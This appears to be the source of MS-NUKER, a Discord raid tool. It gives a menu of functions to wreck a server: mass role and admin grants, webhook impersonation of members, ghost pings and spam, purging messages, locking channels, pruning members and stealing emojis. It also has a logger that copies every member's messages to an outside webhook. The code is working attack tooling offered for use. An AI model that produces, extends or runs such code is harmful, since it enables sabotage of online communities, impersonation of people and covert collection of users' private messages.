    async def _u(e):
        try: await g.unban(e.user); log_ok(e.user.name); return True
        except: return False
    r = await asyncio.gather(*[_u(e) for e in bans])
    _summary("Unban All", r.count(True), r.count(False), time.perf_counter()-t)

async def deafen_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SOURDINE VC"); fx_load("deafening", 16, .002)
    t = time.perf_counter(); ok=fail=0
    for m in g.members:
        if m.voice and m.voice.channel and m.id not in NO_BAN_KICK_ID:
            try: await m.edit(deafen=True); log_ok(m.name); ok += 1
            except: fail += 1
    _summary("Deafen All", ok, fail, time.perf_counter()-t)

async def disconnect_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("KICK VC ALL")
    if not _confirm("kick all from voice"): return log_info("canceled")
    fx_load("disconnecting", 16, .002)
    t = time.perf_counter(); ok=fail=0
    for m in g.members:
        if m.voice and m.voice.channel and m.id not in NO_BAN_KICK_ID:
            try: await m.move_to(None); log_ok(m.name); ok += 1
            except: fail += 1
    _summary("Kick VC All", ok, fail, time.perf_counter()-t)

async def ghost_ping_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("GHOST PING")
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    if not tc: return log_err("no text channels")
    chan = tc[0]; log_info(f"via #{chan.name}")
    fx_load("pinging", 18, .002)
    t = time.perf_counter(); ok=fail=0
    for m in g.members:
        if m.bot or m.id in NO_BAN_KICK_ID: continue
        try:
            msg = await chan.send(f"<@{m.id}>"); await msg.delete()
            log_ok(m.name); ok += 1
        except: fail += 1
    _summary("Ghost Ping", ok, fail, time.perf_counter()-t)

async def impersonate(sid):
    g = _get_guild(sid)
    if not g: return
    _section("IMPERSONATE")
    tid = _ask("target user ID")
    try: target = await g.fetch_member(int(tid))
    except: return log_err("member not found")
    msg = _ask("message to send as this person")
    if not msg: return log_err("message required")
    cid_raw = _ask("channel ID  [enter = all channels]")
    if cid_raw:
        try:
            cs = g.get_channel(int(cid_raw))
            if not cs or not isinstance(cs, discord.TextChannel): return log_err("channel not found or not text")
            tc = [cs]
        except ValueError: return log_err("invalid channel ID")
    else:
        tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    log_info(f"target  {target.display_name}  |  {len(tc)} channel(s)")
    fx_load("cloning", 18, .002)
    t = time.perf_counter(); ok=fail=0
    async with aiohttp.ClientSession() as session:
        for chan in tc:
            wh_obj = None
            try:
                wh_obj = await chan.create_webhook(name=target.display_name[:32])
                wh = discord.Webhook.from_url(wh_obj.url, session=session)
                await wh.send(content=msg, username=target.display_name[:80], avatar_url=str(target.display_avatar.url))
                await wh_obj.delete(); log_ok(f"#{chan.name}"); ok += 1
            except Exception as e:
                log_err(_vis(str(e))); fail += 1
                if wh_obj:
                    try: await wh_obj.delete()
                    except: pass
    _summary("Impersonate", ok, fail, time.perf_counter()-t)

async def create_channels(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CREATE CHANNELS")
    try: num = int(_ask("quantity"))
    except ValueError: return log_err("invalid")
    typ  = _ask("type [text/voice]").lower()
    name = _ask("name  [enter = pub]") or RAID_NAME
    if typ not in ('text','voice'): return log_err("invalid type")
    fx_load("spawning", 20, .002)
    t = time.perf_counter()
    r = await asyncio.gather(*[create_channel(g, typ, name) for _ in range(num)])
    _summary("Create Channels", sum(x is not None for x in r), sum(x is None for x in r), time.perf_counter()-t)

async def create_roles(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CREATE ROLES")
    try: num = int(_ask("quantity"))
    except ValueError: return log_err("invalid")
    name = _ask("role name  [enter = pub]") or "MS-NUKER"
    fx_load("generating", 18, .002)
    t = time.perf_counter()
    async def _cr():
        try:
            col = discord.Colour.from_rgb(random.randint(0,255), random.randint(0,255), random.randint(0,255))
            r = await g.create_role(name=name, colour=col); log_ok(f"@{r.name}"); return True
        except: return False
    r = await asyncio.gather(*[_cr() for _ in range(num)])
    _summary("Create Roles", r.count(True), r.count(False), time.perf_counter()-t)

async def get_admin(sid):
    g = _get_guild(sid)
    if not g: return
    _section("GET ADMIN"); target = _ask("user ID  [enter = everyone]")
    fx_spin("forging role", .8)
    try:
        col  = discord.Colour.red()
        role = await g.create_role(name="MS-NUKER ADMIN", colour=col, permissions=discord.Permissions.all())
    except Exception as e: return log_err(_vis(str(e)))
    t = time.perf_counter()
    if not target:
        async def _a(m):
            if m.bot: return False
            try: await m.add_roles(role); log_ok(m.name); return True
            except: return False
        results = await asyncio.gather(*[_a(m) for m in g.members])
        _summary("Get Admin (all)", results.count(True), results.count(False), time.perf_counter()-t)
    else:
        try:
            m = await g.fetch_member(int(target)); await m.add_roles(role); log_ok(f"{m.name} -> admin")
        except Exception as e: log_err(_vis(str(e)))

async def change_server(sid):
    g = _get_guild(sid)
    if not g: return
    _section("EDIT SERVER")
    name = _ask("new name  [enter = pub]") or SERVER_CONFIG['new_name']
    icon = _ask("icon url  [enter = skip]") or SERVER_CONFIG['new_icon']
    desc = _ask("description  [enter = pub]") or SERVER_CONFIG['new_description']
    fx_spin("applying", .8)
    t = time.perf_counter(); ok=0
    try: await g.edit(name=name); log_ok("name"); ok += 1
    except Exception as e: log_err(f"name  {_vis(str(e))}")
    try: await g.edit(description=desc); log_ok("desc"); ok += 1
    except Exception as e: log_err(f"desc  {_vis(str(e))}")
    if icon:
        try:
            with urllib.request.urlopen(icon) as res: await g.edit(icon=res.read())
            log_ok("icon"); ok += 1
        except Exception as e: log_err(f"icon  {_vis(str(e))}")
    _summary("Edit Server", ok, 3-ok, time.perf_counter()-t)

async def rename_all_channels(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RENAME CHANNELS"); name = _ask("new name  [enter = pub]") or RAID_NAME
    fx_load("renaming", 20, .002)
    t = time.perf_counter(); ok=fail=0
    for i, ch in enumerate(g.channels):
        if isinstance(ch, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel)):
            try: await ch.edit(name=f"{name}-{i+1}"); log_ok(f"{name}-{i+1}"); ok += 1
            except: fail += 1
    _summary("Rename Channels", ok, fail, time.perf_counter()-t)

async def rename_all_roles(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RENAME ROLES"); name = _ask("new name  [enter = pub]") or "MS-NUKER"
    fx_load("renaming", 18, .002)
    t = time.perf_counter(); ok=fail=0
    for i, r in enumerate([r for r in g.roles if not r.is_default()]):
        try: await r.edit(name=f"{name}-{i+1}"); log_ok(f"@{name}-{i+1}"); ok += 1
        except: fail += 1
    _summary("Rename Roles", ok, fail, time.perf_counter()-t)

async def category_creator(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CREATE CATS")
    try: count = int(_ask("quantity"))
    except ValueError: return log_err("invalid")
    name = _ask("name  [enter = pub]") or "MS-NUKER"
    fx_load("creating", 16, .002)
    t = time.perf_counter(); ok=fail=0
    for i in range(count):
        try: await g.create_category(f"{name} {i+1}"); log_ok(f"{name} {i+1}"); ok += 1
        except: fail += 1
    _summary("Create Cats", ok, fail, time.perf_counter()-t)

async def dehoist_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("FIX NICKS"); fx_load("processing", 16, .002)
    t = time.perf_counter(); ok=fail=0
    special = set("!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~")
    for m in g.members:
        if m.bot: continue
        n = m.display_name
        if n and n[0] in special:
            clean = n.lstrip("".join(special)) or "ms"
            try: await m.edit(nick=clean); log_ok(f"{n} -> {clean}"); ok += 1
            except: fail += 1
    if not ok: log_info("nothing to fix")
    _summary("Fix Nicks", ok, fail, time.perf_counter()-t)

async def clone_server(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CLONE SERVER"); fx_spin("scanning", 1.0)
    t = time.perf_counter(); cats={}; chans=[]
    for ch in g.channels:
        if isinstance(ch, discord.CategoryChannel): cats[ch.id] = ch.name
        elif isinstance(ch, (discord.TextChannel, discord.VoiceChannel)):
            chans.append({"name":ch.name,"type":"text" if isinstance(ch,discord.TextChannel) else "voice","category":cats.get(ch.category_id)})
    path = f"clone_{g.id}.json"
    with open(path,"w",encoding="utf-8") as f:
        json.dump({"name":g.name,"channels":chans,"categories":list(cats.values())},f,indent=2)
    log_ok(f"saved  {path}")
    _summary("Clone Server", len(chans), 0, time.perf_counter()-t)

async def mass_move(sid):
    g = _get_guild(sid)
    if not g: return
    _section("MOVE ALL VC")
    vcs = [c for c in g.channels if isinstance(c, discord.VoiceChannel)]
    if not vcs: return log_err("no voice channels")
    for i, vc in enumerate(vcs): log_info(f"[{i+1}] #{vc.name}")
    try: target = vcs[int(_ask("target VC number"))-1]
    except: return log_err("invalid")
    fx_load("moving", 14, .002)
    t = time.perf_counter(); ok=fail=0
    for m in g.members:
        if m.voice and m.voice.channel:
            try: await m.move_to(target); log_ok(f"{m.name} -> #{target.name}"); ok += 1
            except: fail += 1
    _summary("Move All VC", ok, fail, time.perf_counter()-t)

async def lockdown(sid):
    g = _get_guild(sid)
    if not g: return
    _section("LOCKDOWN")
    if not _confirm(f"lock {g.name}"): return log_info("canceled")
    fx_load("locking", 20, .002)
    t = time.perf_counter(); ok=fail=0
    for ch in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        try: await ch.set_permissions(g.default_role, send_messages=False); log_ok(f"#{ch.name}"); ok += 1
        except: fail += 1
    _summary("Lockdown", ok, fail, time.perf_counter()-t)

async def server_info(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SERVER INFO"); fx_spin("fetching", .7)
    bans = [e async for e in g.bans()]
    rows = [("name",g.name),("id",str(g.id)),("owner",str(g.owner)),("members",str(g.member_count)),
            ("bans",str(len(bans))),("channels",str(len(g.channels))),
            ("text",str(len([c for c in g.channels if isinstance(c,discord.TextChannel)]))),
            ("voice",str(len([c for c in g.channels if isinstance(c,discord.VoiceChannel)]))),
            ("roles",str(len(g.roles))),("emojis",str(len(g.emojis))),
            ("boosts",str(g.premium_subscription_count)),("created",g.created_at.strftime('%Y-%m-%d'))]
    print(); print(f"  {D2}{'─'*38}{RS}")
    for k,v in rows: print(f"  {DIM}{k:<14}{RS}  {R2}{v}{RS}")
    print(f"  {D2}{'─'*38}{RS}"); print()

_wh_logger_url:      str  = ""
_wh_logger_guild_id: int  = 0
_wh_logger_active:   bool = False

async def _dispatch_log(entry: str):
    if not _wh_logger_url: return
    try:
        payload = json.dumps({"content": entry[:1990], "username": "ms-logger"})
        async with aiohttp.ClientSession() as session:
            async with session.post(_wh_logger_url, data=payload,
                headers={"Content-Type":"application/json"},
                timeout=aiohttp.ClientTimeout(total=5)) as resp: pass
    except: pass

async def webhook_logger(sid):
    global _wh_logger_url, _wh_logger_guild_id, _wh_logger_active
    g = _get_guild(sid)
    if not g: return
    _section("WEBHOOK LOGS")
    url = _ask("Discord webhook URL")
    if "discord.com/api/webhooks/" not in url and "discordapp.com/api/webhooks/" not in url:
        return log_err("Invalid URL")
    _wh_logger_url = url; _wh_logger_guild_id = g.id; _wh_logger_active = True
    await _dispatch_log(f"\u2705 **MS-NUKER Logger active** on `{g.name}`")
    log_ok(f"logger active  ->  {url[:55]}..."); log_warn("remains active until quit")

async def webhook_logger_check(message: discord.Message):
    if not _wh_logger_active: return
    if not message.guild or message.guild.id != _wh_logger_guild_id: return
    if message.author.bot: return
    entry = (f"**#{message.channel.name}**  |  **{message.author}** (`{message.author.id}`)\n"
             f"```{(message.content or '[no text]')[:1700]}```")
    await _dispatch_log(entry)

async def purge_messages(sid):
    g = _get_guild(sid)
    if not g: return
    _section("PURGE MESSAGES")
    mode = _ask("mode  [all = all channels  |  id = single channel]").lower()
    try: limit = int(_ask("messages per channel (max 1000)"))
    except ValueError: return log_err("invalid")
    limit = min(limit, 1000)
    if mode == "id":
        cid = _ask("channel ID")
        try:
            ch = g.get_channel(int(cid))
            if not ch or not isinstance(ch, discord.TextChannel): return log_err("channel not found")
            tc = [ch]
        except ValueError: return log_err("invalid ID")
    else:
        tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    if not _confirm(f"purge {limit} msgs in {len(tc)} channel(s)"): return log_info("canceled")
    fx_load("purging", 20, .002)
    t = time.perf_counter(); ok=fail=0
    for chan in tc:
        try:
            deleted = await chan.purge(limit=limit)
            log_ok(f"#{chan.name}  {len(deleted)} msgs"); ok += len(deleted)
        except discord.Forbidden: log_err(f"no perm #{chan.name}"); fail += 1
        except discord.HTTPException as e: log_err(f"http{e.status} #{chan.name}"); fail += 1
    _summary("Purge Messages", ok, fail, time.perf_counter()-t)

async def export_logs(sid):
    _section("EXPORT LOGS")
    if not _LOGS:
        return log_info("no logs to export")
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), f"logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"MS-NUKER Log Export - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*60}\n\n")
            for entry in _LOGS:
                f.write(f"{entry}\n")
        log_ok(f"exported {len(_LOGS)} entries -> {path}")
    except Exception as e:
        log_err(f"export failed: {_vis(str(e))}")

async def channel_slowmode(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CHANNEL SLOWMODE")
    try: seconds = int(_ask("slowmode seconds (0=off, max=21600)"))
    except ValueError: return log_err("invalid")
    seconds = max(0, min(seconds, 21600))
    if not _confirm(f"set {seconds}s slowmode on all channels"): return log_info("canceled")
    fx_load("applying slowmode", 20, .002)
    t = time.perf_counter(); ok=fail=0
    for ch in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        try: await ch.edit(slowmode_delay=seconds); log_ok(f"#{ch.name}  {seconds}s"); ok += 1
        except: fail += 1
    _summary("Slowmode", ok, fail, time.perf_counter()-t)

async def webhook_nuke(sid):
    g = _get_guild(sid)
    if not g: return
    _section("WEBHOOK NUKE")
    if not _confirm(f"delete ALL webhooks in {g.name}"): return log_info("canceled")
    fx_load("nuking webhooks", 20, .002)
    t = time.perf_counter(); ok=fail=0
    for ch in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        try:
            whs = await ch.webhooks()
            for wh in whs:
                try: await wh.delete(); log_ok(f"wh {wh.name} in #{ch.name}"); ok += 1
                except: fail += 1
        except: pass
    _summary("Webhook Nuke", ok, fail, time.perf_counter()-t)

async def role_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("ROLE ALL")
    rid = _ask("role ID  [enter = create new admin role]")
    if rid:
        try: role = g.get_role(int(rid))
        except: return log_err("invalid role ID")
        if not role: return log_err("role not found")
    else:
        try:
            role = await g.create_role(name="MS-NUKER", colour=discord.Colour.red(), permissions=discord.Permissions.all())
            log_ok(f"created @{role.name}")
        except Exception as e: return log_err(f"create role failed: {_vis(str(e))}")
    fx_load("assigning", 20, .002)
    t = time.perf_counter(); ok=fail=0
    for m in g.members:
        if m.bot: continue
        try: await m.add_roles(role); log_ok(m.name); ok += 1
        except: fail += 1
    _summary("Role All", ok, fail, time.perf_counter()-t)

async def channel_topic_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("TOPIC SPAM")
    topic = _ask("new topic  [enter = pub]") or PUB_SHORT
    fx_load("setting topics", 18, .002)
    t = time.perf_counter(); ok=fail=0
    for ch in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        try: await ch.edit(topic=topic[:1024]); log_ok(f"#{ch.name}"); ok += 1
        except: fail += 1
    _summary("Topic Spam", ok, fail, time.perf_counter()-t)

async def permission_override(sid):
    g = _get_guild(sid)
    if not g: return
    _section("PERMISSION OVERRIDE")
    log_info("modes: deny_send | deny_view | deny_all | allow_all")
    mode = _ask("mode").lower()
    modes = {
        "deny_send": {"send_messages": False},
        "deny_view": {"view_channel": False},
        "deny_all":  {"send_messages": False, "view_channel": False, "connect": False},
        "allow_all": {"send_messages": True, "view_channel": True, "connect": True},
    }
    if mode not in modes: return log_err("invalid mode")
    if not _confirm(f"apply '{mode}' to @everyone in all channels"): return log_info("canceled")
    fx_load("overriding", 20, .002)
    t = time.perf_counter(); ok=fail=0
    overwrite = discord.PermissionOverwrite(**modes[mode])
    for ch in g.channels:
        try: await ch.set_permissions(g.default_role, overwrite=overwrite); log_ok(f"#{ch.name}"); ok += 1
        except: fail += 1
    _summary("Permission Override", ok, fail, time.perf_counter()-t)

async def steal_emojis(sid):
    g = _get_guild(sid)
    if not g: return
    _section("STEAL EMOJIS")
    target_id = _ask("target server ID (to steal FROM)")
    try: target = bot.get_guild(int(target_id))
    except: return log_err("invalid ID")
    if not target: return log_err("bot not in target server")
    emojis = list(target.emojis)
    if not emojis: return log_info("target has no emojis")
    log_info(f"{len(emojis)} emojis found in {target.name}")
    if not _confirm(f"copy {len(emojis)} emojis to {g.name}"): return log_info("canceled")
    fx_load("stealing", 18, .002)
    t = time.perf_counter(); ok=fail=0
    async with aiohttp.ClientSession() as session:
        for emoji in emojis:
            try:
                async with session.get(str(emoji.url)) as resp:
                    if resp.status == 200:
                        data = await resp.read()
                        await g.create_custom_emoji(name=emoji.name, image=data)
                        log_ok(f":{emoji.name}:"); ok += 1
                    else: fail += 1
            except: fail += 1
    _summary("Steal Emojis", ok, fail, time.perf_counter()-t)

async def prune_members(sid):
    g = _get_guild(sid)
    if not g: return
    _section("PRUNE MEMBERS")
    try: days = int(_ask("inactive days (1-30)"))
    except ValueError: return log_err("invalid")
    days = max(1, min(days, 30))
    estimate = await g.estimate_pruned_members(days=days)
    log_info(f"estimated prune: {estimate} members")
    if not _confirm(f"prune {estimate} inactive members ({days} days)"): return log_info("canceled")
    fx_load("pruning", 18, .002)
    t = time.perf_counter()
    try:
        pruned = await g.prune_members(days=days, reason="MS-NUKER prune")
        log_ok(f"pruned {pruned} members")
        _summary("Prune", pruned or 0, 0, time.perf_counter()-t)
    except Exception as e:
        log_err(_vis(str(e)))
        _summary("Prune", 0, 1, time.perf_counter()-t)

def _actions(sid, bot_id):
    return {
        '01': lambda: nuke(sid),
        '02': lambda: auto_raid(sid),
        '03': lambda: ban_all(sid, bot_id),
        '04': lambda: kick_all(sid, bot_id),
        '05': lambda: mute_all(sid),
        '06': lambda: unban_all(sid),
        '07': lambda: delete_all_channels(sid),
        '08': lambda: delete_emojis(sid),
        '09': lambda: delete_stickers(sid),
        '10': lambda: create_channels(sid),
        '11': lambda: create_roles(sid),
        '12': lambda: category_creator(sid),
        '13': lambda: rename_all_channels(sid),
        '14': lambda: rename_all_roles(sid),
        '15': lambda: change_server(sid),
        '16': lambda: nick_all(sid),
        '17': lambda: dehoist_all(sid),
        '18': lambda: get_admin(sid),
        '19': lambda: impersonate(sid),
        '20': lambda: ghost_ping_all(sid),
        '21': lambda: strip_roles(sid),
        '22': lambda: dm_all(sid),
        '23': lambda: dm_spam_user(sid),
        '24': lambda: webhook_spam(sid),
        '25': lambda: server_info(sid),
        '26': lambda: clone_server(sid),
        '27': lambda: webhook_logger(sid),
        '28': lambda: lockdown(sid),
        '29': lambda: deafen_all(sid),
        '30': lambda: disconnect_all(sid),
        '31': lambda: mass_move(sid),
        '32': lambda: invite_spam(sid),
        '33': lambda: spam_channel(sid),
        '34': lambda: thread_spam(sid),
        '35': lambda: reaction_spam(sid),
        '36': lambda: vc_spam(sid),
        '37': lambda: spoiler_spam(sid),
        '38': lambda: poll_spam(sid),
        '39': lambda: event_spam(sid),
        '41': lambda: purge_messages(sid),
        '42': lambda: export_logs(sid),
        '43': lambda: channel_slowmode(sid),
        '44': lambda: webhook_nuke(sid),
        '45': lambda: role_all(sid),
        '46': lambda: channel_topic_spam(sid),
        '47': lambda: permission_override(sid),
        '48': lambda: steal_emojis(sid),
        '49': lambda: prune_members(sid),
    }
def _boot():
    if os.name == 'nt':
        os.system('title MS-NUKER v1.0.0')
    else:
        sys.stdout.write('\033]0;MS-NUKER v1.0.0\007')
    _clr()
    try:
        ts = os.get_terminal_size()
        rows, cols = ts.lines - 1, ts.columns
    except:
        rows, cols = 30, 80
    dur = 1.4
    chars   = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@$%&*=#~<>{}[]"
    grad    = [R0, R1, R1, R2, R2, R3, R3, R4, R5]
    streams = [random.randint(0, rows) for _ in range(cols)]
    end, first = time.time()+dur, True
    sys.stdout.write("\033[?25l")
    while time.time() < end:
        lines = []
        for row in range(rows):
            line = ""
            for col in range(cols):
                dist = streams[col] - row
                if dist == 0:
                    line += f"{R0}{B}{random.choice(chars)}{RS}"
                elif 0 < dist < len(grad):
                    line += f"{grad[dist]}{random.choice(chars)}{RS}"
                else:
                    line += " "
            lines.append(line)
        if first: sys.stdout.write("\n"*rows); first = False
        sys.stdout.write(f"\033[{rows}A")
        for l in lines: sys.stdout.write(l+"\n")
        sys.stdout.flush()
        for col in range(cols):
            streams[col] = 0 if random.random()<.05 else streams[col]+1
            if streams[col] > rows + len(grad):
                streams[col] = random.randint(-6, 0)
        time.sleep(.04)
    sys.stdout.write("\033[?25h")
    _clr()
    _print_banner(animated=True)
    fx_load("loading modules", 24, .002)
    print()
    _flag = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".ms_first")
    if not os.path.exists(_flag):
        try:
            open(_flag, 'w').close()
            webbrowser.open(DISCORD_URL)
            time.sleep(.4)
            webbrowser.open(GITHUB_URL)
            time.sleep(.4)
            _star = os.path.join(os.path.dirname(os.path.abspath(__file__)), "star.PNG")
            if os.path.exists(_star): webbrowser.open(_star)
        except: pass

_boot()

_SESSION_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".ms_session.json")

def _load_session():
    try:
        with open(_SESSION_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def _save_session(token, sid):
    try:
        with open(_SESSION_FILE, "w", encoding="utf-8") as f:
            json.dump({"token": token, "server_id": sid}, f)
    except:
        pass

_prev = _load_session()
bot_token = ""
server_id = ""

if _prev.get("token") and _prev.get("server_id"):
    masked_tok = _prev["token"][:6] + "..." + _prev["token"][-4:]
    print(f"  {R3}┌{'─'*48}┐{RS}")
    print(f"  {R3}│{RS}  {WHT}{B}Previous Session{RS}{' '*30}{R3}│{RS}")
    print(f"  {R3}├{'─'*48}┤{RS}")
    print(f"  {R3}│{RS}  {GRY}token{RS}     {DIM}{masked_tok}{RS}")
    print(f"  {R3}│{RS}  {GRY}server{RS}    {DIM}{_prev['server_id']}{RS}")
    print(f"  {R3}└{'─'*48}┘{RS}")
    use_prev = input(f"\n  {R2}▸{RS} {wht('use previous session?')} {DIM}[yes/no]{RS} {D2}:{RS} ").strip().lower()
    if use_prev == "yes":
        bot_token = _prev["token"]
        server_id = _prev["server_id"]
        print(f"  {R1}◆{RS} {GRY}session restored{RS}\n")

if not bot_token or not server_id:
    print(f"  {R3}┌{'─'*48}┐{RS}")
    print(f"  {R3}│{RS}  {WHT}{B}Authentication{RS}{' '*32}{R3}│{RS}")
    print(f"  {R3}├{'─'*48}┤{RS}")
    bot_token = input(f"  {R3}│{RS}  {R1}▸{RS} {wht('token')}     {D2}:{RS} ").strip()
    server_id = input(f"  {R3}│{RS}  {R1}▸{RS} {wht('server id')} {D2}:{RS} ").strip()
    print(f"  {R3}└{'─'*48}┘{RS}\n")

if not bot_token or not server_id:
    print(f"  {R4}[×]{RS} {GRY}token and server ID required{RS}"); sys.exit(1)

_save_session(bot_token, server_id)

intents = discord.Intents.all()
bot     = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_connect():
    print(f"  {R1}[+]{RS} {WHT}Conexion establecida, cargando...{RS}")
    sys.stdout.flush()

@bot.event
async def on_ready():
    global server_id, bot_token
    try:
        print(f"  {R2}[*]{RS} {WHT}on_ready disparado como: {bot.user} | servidores: {len(bot.guilds)}{RS}")
        sys.stdout.flush()
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(f"\n  {R3}[x]{RS} {WHT}Bot no encontrado en servidor ID: {server_id}{RS}")
            if bot.guilds:
                print(f"  {GRY}Servidores disponibles:{RS}")
                for g in bot.guilds:
                    print(f"    {DIM}· {g.name}  ({g.id}){RS}")
            else:
                print(f"  {R3}[!]{RS} {WHT}El bot no esta en NINGUN servidor.{RS}")
                print(f"  {GRY}Invita el bot al servidor con permisos de administrador.{RS}")
            print(f"\n  {GRY}Tambien verifica que 'SERVER MEMBERS INTENT' y 'MESSAGE CONTENT INTENT' esten activados en el portal de Discord Developer.{RS}\n")
            input(f"  {D2}[ enter para salir ]{RS}")
            await bot.close()
            return
        await _print_banner_async(bot.user.name, guild.name, guild.member_count, animated=True)
        fx_spin("authenticating", .7)
        log_ok(f"ready  {guild.name}  ({guild.member_count} members)")
        try:
            pt = getattr(ActivityType, BOT_PRESENCE["type"].lower(), ActivityType.playing)
            await bot.change_presence(activity=Activity(type=pt, name=BOT_PRESENCE["text"]))
        except: pass
    except Exception as _re:
        print(f"  {R3}[x]{RS} {WHT}Error en on_ready: {_re}{RS}")
        sys.stdout.flush()
        return

    acts = _actions(server_id, bot.user.id)
    page = 1

    while True:
        _clr()
        _print_banner(bot.user.name, guild.name, guild.member_count)
        _print_menu(page)
        raw = await asyncio.get_event_loop().run_in_executor(None, input, "")
        raw = raw.strip(); choice = raw.lower()

        if choice in ('q','quit','exit') or raw == '40':
            _clr(); print(f"\n  {R1}{B}MS-NUKER  |  goodbye  |  {PUB_SHORT}{RS}\n")
            await bot.close(); break
        if choice in ('n','next') and page < 3: page += 1; continue
        if choice in ('b','back') and page > 1: page -= 1; continue

        if raw == '50':
            _clr()
            _print_banner(bot.user.name, guild.name, guild.member_count)
            _section("CHANGE SERVER")
            new_sid = _ask("new server ID")
            new_guild = bot.get_guild(int(new_sid)) if new_sid.isdigit() else None
            if not new_guild:
                log_err("bot not in that server or invalid ID")
            else:
                server_id = new_sid
                guild = new_guild
                acts = _actions(server_id, bot.user.id)
                _save_session(bot_token, server_id)
                log_ok(f"switched to {guild.name} ({guild.member_count} members)")
        elif raw.isdigit() and 51 <= int(raw) <= 60:
            _clr()
            _print_banner(bot.user.name, guild.name, guild.member_count)
            _section("STAR FOR UNLOCK")
            log_warn("star the repo to unlock premium features !")
            log_info("github.com/M-Societyy")
            try:
                _star = os.path.join(os.path.dirname(os.path.abspath(__file__)), "star.PNG")
                if os.path.exists(_star): webbrowser.open(_star)
                time.sleep(.4)
                webbrowser.open(DISCORD_URL)
                time.sleep(.3)
                webbrowser.open(GITHUB_URL)
            except: pass
        elif raw in acts:
            _clr()
            _print_banner(bot.user.name, guild.name, guild.member_count)
            print()
            try: await acts[raw]()
            except Exception as e: log_err(_vis(str(e)))
        elif raw:
            log_err(f"unknown  {raw}")

        print()
        await asyncio.get_event_loop().run_in_executor(None, input, f"  {D2}[ enter ]{RS}")

@bot.event
async def on_message(message: discord.Message):
    await webhook_logger_check(message)
    await bot.process_commands(message)

if __name__ == "__main__":
    print(f"\n  {R2}[*]{RS} {WHT}Conectando con Discord...{RS} {DIM}(puede tardar unos segundos){RS}\n")
    sys.stdout.flush()
    try:
        bot.run(bot_token, log_handler=None)
    except discord.LoginFailure:
        print(f"\n  {R3}[x]{RS} {WHT}Token invalido o expirado. Borra .ms_session.json y vuelve a ejecutar.{RS}\n")
        sys.exit(1)
    except Exception as _e:
        print(f"\n  {R3}[x]{RS} {WHT}Error al conectar: {_e}{RS}\n")
        sys.exit(1)
